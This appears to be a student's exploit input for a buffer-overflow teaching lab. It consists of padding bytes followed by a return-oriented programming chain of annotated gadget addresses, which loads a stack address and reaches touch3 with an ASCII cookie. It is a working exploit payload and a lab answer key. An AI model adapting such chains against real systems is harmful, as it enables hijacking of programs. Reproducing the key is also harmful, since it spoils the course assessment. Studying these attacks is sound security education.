00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

*/popq %rax*/
36 1a 40 00 00 00 00 00
20 00 00 00 00 00 00 00 /* offset */
5a 1a 40 00 00 00 00 00 /* movl %eax, %ecx */
00 1b 40 00 00 00 00 00 /* movl %ecx, %edx */
75 1a 40 00 00 00 00 00 /* movl %edx, %esi */

e0 1a 40 00 00 00 00 00 /* movq %rsp, %rax */
20 1a 40 00 00 00 00 00 /* movq %rax, %rdi */
4d 1a 40 00 00 00 00 00 /* add_xy */
20 1a 40 00 00 00 00 00 /* movq %rax, %rdi */

/* touch3 */
74 19 40 00 00 00 00 00

/* cookie */
34 37 64 62 34 65 33 61
